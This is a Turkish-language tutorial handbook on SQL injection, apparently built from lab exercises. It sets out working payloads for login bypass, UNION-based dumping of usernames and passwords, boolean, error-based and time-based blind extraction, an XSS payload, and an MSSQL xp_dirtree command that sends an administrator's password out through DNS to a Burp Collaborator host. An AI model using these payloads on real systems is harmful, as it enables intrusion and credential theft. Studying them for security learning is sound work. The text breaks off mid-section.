---
title: "SQL Injection El kitabı"
date: 2025-05-10
categories: [Siber Güvenlik, Handbook]
tags: [sql-injection, handbook, learn]
---

# SQL injection nedir ? 
Bir uygulamanın database'e erişim sağlayıp veri işlemi yapmak için yazdığı koda bir saldırganın araya girip kendi kodunu yazması, verilere erişebilme ve değiştirme fırsatı tanıyan bir zafiyet türüdür. Bazı durumlarda SQL injection ile server veya back-end'in tehlikeli durumlara yönlendirmesi veyahut ta dos saldırılarına sebep olabilmesidir.
## SQL açıkları nasıl tespit edilir ?
1. Tek tırnak `'` işareti ile bir hata veriyor mu veya bir anormalliğe sebep oluyor mu ?
2. SQL'e özel syntaxlar yazılabiliyor mu ? mesela  1 yerine `CHAR(49)` veya `ASCII("1")` gibi
3. Mantıksal koşullar ile ; OR `1=1`, OR `1=2`
4. SQL bekletme sorguları; `WAITFOR DELAY '0:0:10'`
5. Out-of-band payload ; `SELECT ... INTO OUTFILE '\\\\<oast-domain>\\xyz'`

# SQL 'de çıktı :
Veriler bazen sayısal bazen de sözel  bir değer olarak tutulabilir. SQL sadece sorgu yazmayı değil ayrıca toplama çıkarma gibi işlemleri de destekler. Veritabanı sayısal ve sözel işlemleri şu şekillerde karşılar;

`SELECT 1; =` 1 |  `SELECT 2-1;` = 1 Veritabanı çıkarma, toplama işlemlerini yapar.

`SELECT ‘2-1’ ;` = String : 2-1 yazar .

`SELECT ‘2’-’1’` = İnt: 1 ve `SELECT ‘2’+’1’;` = İnt: 2 yazar Çıkarma ve toplama işlemi yapar.
* Fakat burada dikkat edilmesi gerek şey; Url + yı boşluk olarak gördüğünden "%2B" ile encode edilmesi gerekiyor.

`SELECT ‘2’+’a’` = İnt: 2 Yazar

`SELECT ‘b’+’a’` = İnt : 0

`SELECT ‘2’ ’1’` ve `SELECT concat (‘2’,’1’)` = String İnterpolision = 21

`SELECT ‘2’ ’1’ ‘a’` = String : 21a

`SELECT ‘2’ ’1’ ‘a’ -1;` = İnt : 20

`SELECT 2^1; = 3` 

`SELECT 2^2;` = 0 Kafalar karışık XOR operantı

`SELECT !1 ;` = 0

`SELECT ~1;` 18446744073709551614 = yaklaşık işareti = Max int input

# SQL injection nasıl çalışıyor ?
Bir web sitede https://insecure-website.com/products?category=Gifts url'ine tıkladığımızda bizi hediyeler kategorisinde olan ürün sayfasına yönlendiriyor. Arka planda çalışan sorgu da bu şekilde;
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`   
sırasıyla SQL kodunu inceleyecek olursak.
* bütün veriler (`*`)
* `products` tablosu
* `Category` olarak `Gift`
* ve `released` 'in değeri de `1` olarak verilmiş
ürünlerin görüntülenmesini sağlayan değer `released = 1` değeri. SQL sorgusuna müdahele edip bir zafiyet var mı diye baktığımızda ; 
`'` tek tırnak işareti ile hata alıyor mu diye bakabiliriz veyahut ta da diğer SQL tespit yöntemlerini uygulayabiliriz.
Sorgunun arasına dahil olmaya çalıştığımızda ;
https://insecure-website.com/products?category=Gifts'+OR+1=1-- ki bunu mantıksal koşul ve yorum satırı kullanarak zafiyetin tespitini yapıyoruz. 
'1=1 ' e eşit veyahut önceki sorgu doğru ise Gifts ve diğer tüm ürünleri döndür' Eğer 1=2 yapsaydık
'1=2 ye eşit olmadığında ve önceki sorgu doğru olduğunda sadece Gifts ürünlerini döndür' demek oluyor
# Farklı kısımlarda SQL injection :
Çoğu SQL injection zafiyetinde `WHERE` içinde `SELECT` sorgusuyla gerçekleşir. Genellikle sorgular bir veriyi seçmek, güncellemek, içerisine başka bir veri eklemek için kullanılır. 
Diğer kısımlar;
* `WHERE` içinde `UPDATE` sorgusunda
* `INSERT` sorgusu içinde
* `SELECT` sorgusuyla ama tablo ve kolon isimlerini yansıtırken
* `SELECT` sorgusunu `ORDER BY` ile yaptığında.

# SQLi'de Mantıksal tabanlı hatalar :
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'` Sorgusu normalde karşımıza login sayfalarında çıkar. ve bizden kullanıcı adı ve parolamızı girmemiz istenir. Sorgunun sonuna  yorum satırı `--`  yazdığımızda  ;
SELECT * FROM users WHERE username = 'wiener'-- şeklinde olur. Bu durumda username kontrolü sağlanıyorsa  parola kontrolü atlanır ve giriş yapılırdı.
Eğer kullanıcı adı daha önceden bir session değişkeninden alınıp sorguya sadece parola parametresi girilseydi, örneğin:

`SELECT * FROM users WHERE username = '‹Session["username"]›' AND password = ‹POST["password"]›';`

parola eşleşirse TRUE, eşleşmezse FALSE dönecek şekilde çalışırdı. Burada `OR 1=1--` ifadesini kullanırsak:
- **Parola = FALSE**
- **OR sonrası ifade = TRUE**
ifadeyi TRUE yapacağı için parola kontrolü de atlanır ve login sayfası başarıyla geçilir.


# SQLi'de Veri Aşırma :
Bu durumda uygulama SQL sorgularının çıktılarını yanıt olarak geri döner. Bir saldırgan SQL injection zafiyetini diğer database tablolarından veri çekmek için kullanabilir. Genelde `UNION` anahtar sözcüğü kullanılır. `SELECT` sözüğü ile istenilen veri kolonu çekilir.
Örneğin Bir uygulama kullanıcı girdisi `Gifts`  içeren sorguyu çalıştırırsa :

` SELECT name, description FROM products WHERE category = 'Gifts'`

Bir saldırgan şu sorguyu dahil edebilir :

`' UNION SELECT username, password FROM users--`

Ardından diğer tabloyu da `Gifts`'in yansıtıldığı yere ekleyebilir.

# Second-order SQL injection :
Birinci derece SQL injection uygulamanın işleyişine kullanıcının HTTP requesti ile SQL sorgusuna kendi inputunu birleştirip emniyetsiz bir şekilde çalıştırması idi.

İkinci derece SQL injection Uygulama kullanıcının inputunu HTTP requesti ile alıp sonra ileride kullanmak için saklamasıdır. Bu genelde database'in içerisine input olarak saklanmasıyla olur. Database üzerinde saklanmasında bir zafiyet meydana gelmez. Fakat sonra farklı bir HTTP isteği çalıştırırken uygulama, depolanan verileri alır ve bunu direk SQL sorgusuna katar.  ikinci seviye SQL inejction Ayrıca Stored SQL injection olarak bilinir. 

Geliştiriciler SQL injection'a karşı ilk veri girişinde önlem alsa da, veritabanına güvenli şekilde kaydedilen veri daha sonra güvensiz biçimde işlendiğinde, ikinci aşamada SQL injection gerçekleşebilir.

## Database Farklılıkları :
* Dize birleştirme için sözdizimi
* Yorum satırı
* Toplu veya istifli sorgular
* Belirli API'nin Platformları
* Hata mesajları

# SQL injection UNION saldırıları:

Bir uygulama SQL Injection (SQLi) zafiyetine sahipse ve sorgu sonuçları uygulamanın yanıtlarında görüntüleniyorsa, **UNION** anahtar kelimesi kullanılarak veritabanındaki diğer tablolardan veri elde edilebilir. Bu tür saldırılar genellikle **SQL Injection UNION saldırısı** olarak adlandırılır.

## UNION Anahtar Kelimesi Nedir?

**UNION** anahtar kelimesi, bir veya daha fazla ek SELECT sorgusunun çalıştırılmasına ve sonuçlarının orijinal sorgunun sonuçlarına eklenmesine olanak tanır. Örneğin:

```SQL
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```


Bu SQL sorgusu, iki sütun içeren tek bir sonuç kümesi döndürür; bunlar:

- `table1` tablosundaki `a` ve `b` sütunlarının değerleri

- `table2` tablosundaki `c` ve `d` sütunlarının değerleri

## UNION Sorgusunun Çalışması İçin Gereken Şartlar

Bir UNION sorgusunun başarılı olabilmesi için iki temel şart yerine getirilmelidir:

1. **Sorgular aynı sayıda sütun döndürmelidir.**

2. **Her bir sütundaki veri türleri uyumlu olmalıdır.**


# SQL Injection UNION Saldırısı Nasıl Yapılır?

Bir SQL Injection UNION saldırısı gerçekleştirmek için, saldırının yukarıdaki iki gereksinimi karşıladığından emin olmanız gerekir. Bu genellikle şu bilgilerin elde edilmesini içerir:

- **Orijinal sorgudan kaç sütunun döndüğü**

- **Hangi sütunların, enjeksiyonla elde edilen verileri (örneğin metin) tutabilecek uygun veri türlerine sahip olduğu**


Bu bilgileri topladıktan sonra, uygun biçimde yapılandırılmış UNION sorguları ile veritabanındaki hassas verilere erişmek mümkün olabilir.

## Sütun Sayısını Belirleme (Column Count)

**SQL Injection UNION saldırısı** yaparken, orijinal sorgunun kaç sütun döndürdüğünü anlamak için iki temel yöntem kullanılır:
### 1. `ORDER BY` Yöntemi

Sorguya artan indekslerle `ORDER BY` eklenir:

```PostgreSQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
Bir hata alınana kadar bu şekilde devam edilir. Hata alındığında, belirtilen sayının bir fazlası sütun sayısını aşmıştır. Böylece, **bir önceki sayı gerçek sütun sayısıdır**.

Sorgu içinde bulunduğu tablonun kolon sayısına göre şekillenir. Kaç adet Kolonu var ise ona göre yazılabilir. Örnek olarak Sorguyu körlemesine denemek yerinenormal çalıştırıp kaç farklı bilgi verdiğine ve gözükmeyen id gibi bilgileri de hesaba katarak kolon sayısını tahmin edebiliriz.

### 2. `UNION SELECT NULL` Yöntemi

* `UNION` kullanıldığında veritabanı iki SELECT ifadesinin aynı sayıda ve aynı türde sütun döndürmesini ister.
*  `UNION` sorgusunda iki sorguyu birleştirdiğinden hata çıkmaması için ikisininde aynı kolon sayısına sahip olması lazımdır. Çalışma biçimi yüzünden bizi böyle bir zorunluluğa iter. 
* Artan sayıda `NULL` içeren `UNION SELECT` sorguları gönderilir:

```PostgreSQL
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

Doğru sütun sayısı yakalandığında, hata alınmaz ve bazı durumlarda yanıtın içeriğinde değişiklik gözlemlenebilir. `NULL` her veri tipine uyum sağladığı için kullanılır.

Her bir NULL değeri Kolon'u temsil eder ve kolon hangi veri tipiyse onunla uyum sağlamak zorundadır. İnteger ise '200' gibi sayı, String ise 'test' gibi yazı girilmesi lazımdır. Sorguya Dahil olup istediğimiz bilgileri yazdırması için string bir alana ihtiyacımız vardır. 

### 3. SQL injection da Veri çekmek için kullanılan genel SQL Sorguları :
Eğer baştan başlayıp tüm veritabanı isimleri isimlerini öğrenmek istiyor isek.  :

```Postgresql
UNION SELECT 1, datname, 3 FROM pg_database--
```
Örneğin: `template0`, `template1`, `postgres`, `academy_labs`

Veritabanı içerisindeki bölümleri öğrenmek istiyor isek bu sorgu kendi bulunduğu veritabanı içerisindeki tüm şema isimlerini tutar :
```postgresql
UNION SELECT 1, schema_name, 3 FROM information_schema.schemata--
```

Acedemy_labs içindeki şemalar :
Örneğin: `pg_catalog`, `information_schema`, `public`
* Ek bilgi olarak : UNION sorgusu ile kendi bulunduğumuz veritabanı dışından veri getiremeyiz.

Şema isminden Tablolara ulaşmak için :
```Postgresql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
```

Tablodan kolonlara ulaşmak için :
```postgresql
+UNION+SELECT+NULL,column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
```


## 4. Tek Bir Sütunda Birden Fazla Değer Çekme

Bazı durumlarda, enjeksiyon yaptığınız sorgu yalnızca **tek bir sütun** döndürebilir. Bu durumda birden fazla alanı aynı anda görebilmek için bu değerleri **birleştirerek** tek sütunda sunabilirsiniz. Bunu yaparken aralarına bir **ayraç** koymak, hangi değerin nerede bittiğini anlamanızı kolaylaştırır.

## Nasıl Yapılır?

- **String Birleştirme Operatörü** kullanın.
    - PostgreSql’ de bu operatör: `|| '~' || `
- Kullanmak istediğiniz sütunları ve aradaki ayıracı yazın.
- Örnek (PostgreSql için):

```sql
 UNION SELECT username || '~' || password FROM users--
```

Sonuçta her satırda şu formatta veri göreceksiniz: `kullanıcıadı~şifre`



# Blind SQL injection

**Blind SQL Injection**, uygulamanın SQL enjeksiyonuna açık olmasına rağmen sorgu sonuçlarını ya da hata mesajlarını doğrudan geri dönmediği durumlardır. Bu tip zafiyetlerde standart UNION saldırıları etkisizdir, zira ek sorgunun çıktısını göremezsiniz. Yine de, uygulamanın davranış farklılıklarını kullanarak veri çekmek mümkündür.

Blind SQLi Güvenlik açıklıklarından yararlanmak için aşağıdaki yöntemler kullanılabilir:
* Tek bir koşula göre uygulamanın yanıtında tespit edilebilir bir farkı tetiklemek için sorgunun mantığını ona uygun şekilde değiştirebilirsiniz. Bu bazı boolean mantığında yeni bir koşul enjekte etmeyi veya divided by zero gibi bir hatayı koşullu olarak tetiklemeyi içerebilir.
* Zamana bağlı olarak tetiklenen bir sorgu yazabilirsiniz. Bu koşulun doğru olması durumunda Database'i bir süre gecikmeli bir şekilde çalıştırır.
* Bazen ise OAST teknikleri ile out-of-band network interaction (Bant dışı ağ etkileşimi) tetikleyebilirsiniz. Bu teknik oldukça güçlüdür. Diğer tekniklerin çalışmadığı zamanda iş görür. 

## Koşullu Yanıtlarla Veri Çekme

Uygulama, mesela bir `TrackingId` çerezi ile kullanıcıyı tanıyorsa “Welcome back” mesajı döndürüyor, aksi halde bu mesaj gelmiyorsa:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '…';
```

Bu sorguya enjekte edeceğiniz koşullar (`AND '1'='1'` vs. `AND '1'='2'`) gerçeğe göre farklı yanıt ürettirerek, **true/false** sonuçlarını gözlemlemenizi sağlar.

**Örnek: Karakter Karakter Parola Öğrenme**

Diyelim `Users` tablosunda `Administrator` adlı bir kullanıcı var. Parolasının ilk karakterini şöyle test edebilirsiniz:

1. Karakterin `'m'`’den büyük olup olmadığını sorun:
```sql
 AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) =>= 'm
 -- Sorgunun farklı hali :
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'a
```

– Eğer “Welcome back” geliyorsa, karakter `'m'`’den büyüktür.

2. Benzer şekilde üst sınırı daraltarak doğru karakteri bulana dek devam edin:

```sql
 AND SUBSTRING(...,1,1) = 's
```

– “Welcome back” mesajı geldiyse, ilk karakter `'s'`’tir.
Bu şekilde her konumu tek tek test ederek parolanın tamamını elde edebilirsiniz.


1. **Neden `SUBSTRING` Kullanılır?**

```sql
AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 't
```
- `SUBSTRING( metin, başlangıç, uzunluk )`  
    → `metin` içinden **başlangıç** pozisyonundan itibaren **uzunluk** kadar karakter döndürür.
- Örnekte: şifrenin 1. karakterini (uzunluğu 1) alıyoruz.
- “İlk harfi almak” istediğimiz için kullanıldı.

2. Parolanın uzunluğunu test etmek için :
```sql
AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a
```
→ Eğer `administrator` kullanıcısının şifresi 10 karakterden uzunsa, sorgu `'a'='a'` olur ve **true** döner.

3. Kullanıcı adı doğrulamak için : 
```sql
 AND (SELECT 'a' FROM users WHERE username='administrator')='a
```



# Error-Based SQL Injection

**Hata Tabanlı SQL Injection**, uygulamanın döndürdüğü **hata mesajları** üzerinden veri sızdırma veya çıkarma teknikleridir. İki temel senaryo vardır:

1. **Koşullu Hata Mesajları**
    
    - Boolean tabanlı saldırılar gibi, belli bir ifade doğruysa farklı bir hata üretilir.
    - Uygulamanın bu hata tepkisini gözleyerek veritabanı hakkında bilgi toplanır.
    
2. **Ayrıntılı Hata Çıktısı**
    
    - Veritabanı yapılandırmasına bağlı olarak, sorgunun sonucunu veya kolon değerlerini içeren hata mesajları görülebilir.
    - Böylece normalde “blind” (görünmez) olan zafiyetler, hata çıktısıyla **görünür** hâle gelir.


Her iki yöntem de, uygulamanın hata tepkilerini manipüle ederek gizli verileri ortaya çıkarma imkânı sunar.

---

Bazı uygulamalar, sorgu sonuçlarına veya boolean ifadelerin doğruluğuna bakmaksızın hep aynı cevabı döner. Böyle “tamamen blind” senaryolarda, **hata ürettirerek** koşula dayalı bilgi sızdırabilir.

1. **Mantıksal ifade :**
    
    - **CASE** ifadesiyle test edilen koşul doğruysa (`THEN`) kasıtlı bir hata (örneğin `1/0`) üretir.
        
    - Koşul yanlışsa (`ELSE`) hatasız, geçerli bir değer döndürür.
        
    - Uygulama hata verdiğinde “true”, hata olmadığında “false” sonucunu çıkarsa.
        
2. **Basit Örnek**
```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
	- `1=1` → hata (`1/0`) → uygulama farklı yanıt verir → koşul **true**
    
	- `1=2` → `'a'='a'` → no‑error → koşul **false**
	
3. **Karakter Parola Sızıntısı**
Şifrenin ikinci karakterinin örneğin `'a'` olup olmadığını test etmek için:

```sql
'' AND (SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')
```
	
	- Eğer karakter `'a'` ise hata oluşur → “true”
    - Değilse sorgu sorunsuz devam eder → “false”

Bu yöntemle, uygulamanın **hata yanıtlarını** gözlemleyerek tek seferde bir karakter şeklinde veritabanı içeriğini çıkarmak mümkündür.


### SQL hata mesajlarının çıktısına göre hassas verileri çıkarmak :
Uygulamalarda yapılan yapılandırma hataları, bazen oldukça detaylı SQL hata mesajlarına neden olabiliyor.

Örneğin `id` parametresine tek tırnak `'` ilave edildiğinde aşağıdaki gibi bir hata mesajı alınıyor :

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Bu mesaj sayesinde, girdinin durumu ve kullanıcının buna nasıl dahil olduğu görünüyor. Syntax hatasını gidermek için `--` (yorum satırı) eklenerek giderilebiliyor. Bu şekilde verilerin varlığını tespit edebiliyoruz. 

Fakat bazı durumlarda oluşan hata durumları, veritabanından dönen verinin kendisini de içerebiliyor. Bu da kör SQLi zafiyetini aktif olarak veri sızdıran bir hale dönüşebiliyor. Bunu tetiklemek için kullanılan yöntemlerden birisi de `CAST()` fonksiyonudur. Bu fonksiyon veri tipleri arasında dönüşüm yapılmasını sağlıyor. Örneğin :

```sql
CAST((SELECT secret FROM users LIMIT 1) AS INT
```

Eğer secret sütunu string tipindeyse ve bu veri integer'a çevirilmeye çalışılırsa ortaya şöyle bir hata çıkıyor ve hatanın içerisinde veri gözlemlenebiliyor :

```sql
ERROR: invalid input syntax for type integer: "FLAG-abc123"
```

Bu tür hatalar, özellikle karakter sınırlaması gibi payload kısıtlarının olduğu yerlerde oldukça etkili olabiliyor.

Bunu bir örnek üzerinde test edelim.

Bir web uygulamasında TrackingId sistemi olup kullanıcıları bu id üzerinden takip eden bir sistem :
`TrackingId=47auKfqhlHFRVevy` ve burada bir sql injection zafiyeti olduğunu düşünün.

SQL sorgusunu öğrenmek için `47auKfqhlHFRVevy'` tek tırnak işareti ile hata vermesini sağlayabiliriz.
```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '47auKfqhlHFRVevy''. Expected  char
```
Sorgu ` SELECT * FROM tracking WHERE id = '47auKfqhlHFRVevy'` sorgusu olarak geliyor.
hatanın kalktığından emin olmak için `--` yorum satırı ekleyebiliriz. Şimdi sorguyu deşip veri aşırma zamanı...

**Veritabanında tip dönüştürme :**
Burada CAST fonksiyonu ile verinin tipini bulunduğu halden istediğimiz hale dönüşmesini belirtebiliriz. Bu uyumsuzluk sayesinde hangi verinin hangi tipe dönüşmeyeceği hususunda bize geri hata döner. Mesela :
```sql
-- Burada uygulamanın veriyonunu CAST ve version() fonksiyonları ile öğreniyoruz. 
AND 1=CAST((SELECT version())AS int)-- Başında ' unutmayın
-- Çıktı
ERROR: invalid input syntax for type integer: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.2) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
```

Pekiii, bu sorguyu veritabanından bilgileri sızdırmak için kullanabiliriz.
```sql
-- Öncelikle veritabanında herhangi bir kısıtlamaya tabi tutulup tutulmadığımızı ölçelim.
47auKfqhlHFRVevy'AND 1=CAST((SELECT username FROM users)AS int)--' -- Sorgu
-- Çıktıda verinin bir kısmının bittiğini görüyoruz. Sorgu 95 karakterlik bir alanı kapsıyor.
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '47auKfqhlHFRVevy'AND 1=CAST((SELECT username FROM users)AS i'. Expected  char'
--Hem sorguyu hataya dayalı bir şekilde çıkarmaya bakacağız. Hemde 95 karakteri geçmeyecek. O yüzden baştaki id' yi siliyoruz. Where sorgusu kendisinin geriye bir veri döndürmesi gerekli. Trackingid olarak boş bıraksak bile AND operetörü ile geriye bir değer döndürdüğümüzde sorgu tamamlanmış olarak göründüğünden ayrıca bir WHERE hatası almıyoruz.
AND 1=CAST((SELECT username FROM users)AS int)-- Sorgu
-- Çıktı :
ERROR: more than one row returned by a subquery used as an expression
-- Şimdi yeni bir hata ile karşılaştık. Bu ifade sorgunun WHERE üzerinden yapılmayıp bir alt sorgu olarka ele alındığından dolayı ve 1 satıra (1 sayısı yani) karşı birden çok satır döndürdüğü için aldığımız bir hata. Bunu aşabilmek için sorguya LIMIT 1 ifadesi ile iki karşılaştırdığımız nesneyi eşitliyoruz.
AND 1=CAST((SELECT username FROM users LIMIT 1)AS int)-- Sorgu
-- Çıktı olarak istediğimiz veriyi yani kullanıcı adını hataya yazdırmayı başardık
ERROR: invalid input syntax for type integer: "administrator"
-- Aynı sorguyu parolaya erişmek için kullanabiliriz.
AND 1=CAST((SELECT password FROM users LIMIT 1)AS int)-- Sorgu
ERROR: invalid input syntax for type integer: "h66sntiqeof8m946yma1"
```

#### **İkinci kısım: Hata tabanlı SQLi ye yönelik sorular ?  :**
**Soru - 1) CAST işlevi farklı şekillerde kullanılabilir mi ?**
		Sorguyu daha da kısaltmanın bir yolu vardır. Normal sorgunun CAST alanını çıkararak ve sonuna ::int(dönüştürülmek istenen değer) yazarak gerçekleşir sorguda şöyle gözükür:
		`AND 1=(SELECT password FROM users LIMIT 1)::int`
**Soru - 2) Veri tipi doğrulamada bir veya birden fazla veri aynı satırda gösterilebilir mi ?** 
		Eğer girdinin ve çıktının bir sınırı yok ise veritabanına göre concat işlevi yapılarak çıktı genişletilir. `AND 1=(SELECT username||password FROM users LIMIT 1)::int--`
**Soru - 3) Peki LIMIT 1 ile ilk satırı aldığımıza göre diğer satırları almak için ne yapmamız lazım** 
		`AND 1=(SELECT username FROM users LIMIT 1 OFFSET 1)::int--`
**Soru - 4) `more than one row` hatasını en kolay nasıl aşabiliriz ?**
		` AND 1=(SELECT string_agg(username,',')FROM users)::int--` PostgreSQL de aggregate(toplayıcı) fonksiyonudur. bütün satırları tek bir liste haline getirir. `<ifade> , <ayırıcı> [ ORDER BY <kolon> ] ` şeklinde çalışır.
**Soru - 5) Başka bir sorgu yapısı kullanılabilir mi ?**
		Evet. Mantıksal tabanlı sorgular burada da kullanılabilir örnek: `'AND 1=(CASE WHEN(1=1)THEN 1/0 ELSE 1 END)-`
**Soru - 6) Hatayı siteye direkt yazdırıyor ise Başka saldırılara yol açabilir mi ?**
		Evet. Filtrelemeden direkt yazdırdığı için XSS gibi zafiyetler çalışabiliyor.
		{% raw %}`'AND (SELECT '&lt;script&gt;alert(2)&lt;/script&gt;'::int)--` {% endraw %}


# Time‑Based Blind SQL Injection:
Uygulama, SQL hatalarını yakalayıp kullanıcıya hiçbir fark göstermiyorsa (örneğin tüm hataları “bir sorun oluştu” sayfasına yönlendiriyorsa), error‑based yöntemler etkisiz kalır. Bu durumda, sorgu şartına bağlı olarak **zamansal gecikme** (delay) tetikleyerek true/false’i ölçeriz.

SQL sorgusunu bozmadan, içine koşula bağlı bir `WAITFOR DELAY` (MSSQL) veya `pg_sleep` (PostgreSQL) gibi bir komut yerleştiririz. Koşul doğruysa bekleme süresi çalışır ve HTTP yanıtı gecikir; yanlışsa hemen yanıt döner. Yanıt süresi sayesinde “koşul doğru mu?” sorusuna yanıt buluruz. Örnek :
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--   -- koşul false → **no delay**  
'; IF (1=1) WAITFOR DELAY '0:0:10'--   -- koşul true → **10 sn delay**  
```
Karakter karakter veri çekmek için yazabileceğimiz sorgu :
```sql
; IF ( SELECT COUNT(*) FROM Users WHERE Username='Administrator' AND SUBSTRING(Password,1,1)> 'm' ) = 1 WAITFOR DELAY '0:0:3'-- Bu sorgular veritabanına göre değişim göstermektedir!
```

Örnek bir uygulama ile de gösterelim. Veritabanı Postgresql. sistemi test etmek için
`'; pg_sleep(5)--` önceki sorguyu kapatıp yeri sorgu ile sistemi geciktirebilinir.
`'| pg_sleep(5)--` eğer int ise concat yaparak fonksiyonun çalışması sağlanır.
`'|| pg_sleep(5)--` eğer string ise fonksiyon çalışır.

**Ara bilgi :**
pg_sleep CASE gibi karşılaştırma yaptığımız Diğer yöntemlerle birlikte (AND, OR) operatörleri ile çalışmaz hata verir çünkü;
pg_sleep() fonksiyonu hiçbir değer döndürmez sadece şu kadar saniye bekle der. Döndürdüğü hiçbir sonuç olmadığı için bunlara void fonksiyonlar denir. Peki void fonksiyon neden sorun çıkartır?
Beraber çalıştığı fonksiyon eğer geriye bir değer bekliyor ve değer void geliyorsa uygulama pg_sleep() çalıştırmak yerine hata veriyor. Tabii istisna durumlar var. `OFFSET`, or veya and olmadan`SELECT CASE WHEN`  komutu gibi 
**Hata veren sorgu :**
Sorgu -`'OR (SELECT CASE WHEN true THEN pg_sleep(5) END)--`  Burada `OR` bir boolean beklenti durumunda.
Hata - `ERROR: argument of OR must be type boolean, not type void`
Hata vermek yerine pg_sleep() çalıştıran sorgu:
`'OFFSET (SELECT COUNT(*) FROM pg_sleep(5))'`

# Blind SQLi, Out of Band (OAST) :
Bazı web uygulamaları, SQL sorgularını kullanıcı isteğinden sonra senkron bir şekilde değil, arka planda farklı bir iş parçacığı (thread) kullanarak çalıştırır. Bu durumda, uygulama kullanıcının isteğine normal şekilde yanıt verirken, SQL sorgusu arka planda yürütülür. Sorgu SQL Injection'a karşı savunmasız olabilir; fakat:
- Sorgudan veri dönmesi beklenmediği,
- Hata mesajı oluşturmadığı,
- Süre bazlı (time-based) gecikmeye neden olmadığı için
**klasik blind SQL injection teknikleri etkili olmaz.**
Bu gibi durumlarda, **"Out-of-Band (OAST)" teknikleri** kullanılarak saldırı gerçekleştirilebilir. Bu yaklaşımda, saldırganın kontrolündeki bir sunucuya yönlendirilen dış ağ istekleri tetiklenir. SQL sorgusu içine enjekte edilen payload'lar, bu dış istekleri (genellikle DNS veya HTTP) oluşturur. Uygulama tarafından başlatılan bu istekler saldırgan tarafından kaydedilerek sistemin zafiyet içerip içermediği ve hangi verilerin sızdırıldığı analiz edilebilir.

### Neden DNS?
OAST tekniklerinde en yaygın kullanılan protokol **DNS**'tir. Çünkü:
- DNS istekleri, çoğu ağda çıkış yönünde serbest bırakılmıştır.
- Uygulamanın veya veritabanının DNS çözümlemesi yapmasına engel olan güvenlik duvarı nadiren bulunur.
- DNS üzerinden bilgi dışa aktarımı mümkündür (örnek: tablo isimleri, kullanıcı bilgileri).

**Örnek: MSSQL ile OAST**
Microsoft SQL Server üzerinde aşağıdaki payload, dışa DNS isteği gönderilmesini sağlar:

```sql
'; exec master..xp_dirtree '//örnek.burpcollaborator.net/a'-- 
```
Bu komut, veritabanını şu DNS adresine sorgu göndermeye zorlar: `örnek.burpcollaborator.net`

## Out-of-Band Kanal Üzerinden Veri Sızdırma
Blind SQL Injection zafiyetinin varlığı ve dışa DNS isteği tetiklenebildiği doğrulandıktan sonra, artık bu **OAST** kanalı üzerinden doğrudan veri sızdırmak mümkündür.

Bu teknikle, hassas bir veritabanı bilgisini DNS isteğine gömerek saldırganın kontrolündeki sunucuya göndermek mümkündür. Örnek:
```SQL
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

**Payloadın içeriği :**
1. **Bir değişken tanımlar:** `@p` adında bir `varchar` değişkeni oluşturulur.
2. **Veriyi okur:** `@p` değişkenine "Administrator" kullanıcısının şifresi atanır.
3. **DNS isteği oluşturur:** `xp_dirtree` komutu, `@p` değişkenini içeren bir domain adına sorgu gönderir.
4. **Veri dışa çıkar:** Bu sorgu, Burp Collaborator üzerinden  şekildeki gibi gözlemlenebilir:
	`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

**Sorular ve Açıklamalar :**
1. `xp_dirtree`, Microsoft SQL Server’a özgü bir **extended stored procedure**’dür. Normalde bir dizin içeriğini listelemek için kullanılır. Örneğin:
	`EXEC master..xp_dirtree 'C:\'`
	Yukarıdaki kullanımda ise, saldırgan tarafından veritabanını DNS isteği yapmaya zorlamak için kulllanılır.
2. `@p` Değişkeni ve `varchar(1024)` Ne Anlama Geliyor?
	- `@p` burada bir **değişken**dir. SQL içinde veriyi geçici olarak tutmak için tanımlanır.
	- `varchar` (variable-length character) bir veri türüdür; **değişken uzunlukta metin** tutar. Yani sabit 1024 karakter yer kaplamaz, sadece gerekli kadar yer kullanır.
	- `(1024)` kısmı, bu değişkende tutulabilecek maksimum karakter sayısını belirtir.
3. DNS Üzerinden Veriyi Teker Teker mi Almalıyız? Toplu Alırsak Ne Olur?
	Evet, **DNS üzerinden veri sızdırırken sınırlamalar** vardır:
	- **DNS alt alan adları (subdomain) genelde maksimum 253 karakter** olabilir. (Her etiket 63 karakterle sınırlıdır, örn. `password1.example.com`)
	- DNS isteği sırasında `@p` içine büyük veri koyarsan, **istek başarısız olabilir** ya da **veri parçalanır.**
	- Ayrıca, DNS çözümleme sırasında bazı karakterler (örneğin boşluk, özel karakterler) geçersizdir ve veri bozulabilir.

**POSTGRESQL :**

PostgreSQL'de tablolar genellikle `public` adlı bir **şema (schema)** altında yer alır. Yani:

- `database` → içinde **schema** barındırır (örneğin: `public`, `admin`, `sales`)
- `schema` → içinde **table** barındırır

Bu yüzden `WHERE table_schema='public'` diyerek **kullanıcıya açık default tabloları** hedef alıyoruz. Database'de tabloları öğrenmek için 

```PostgreSql
-- Tüm veritabanı isimleri
SELECT datname FROM pg_database--

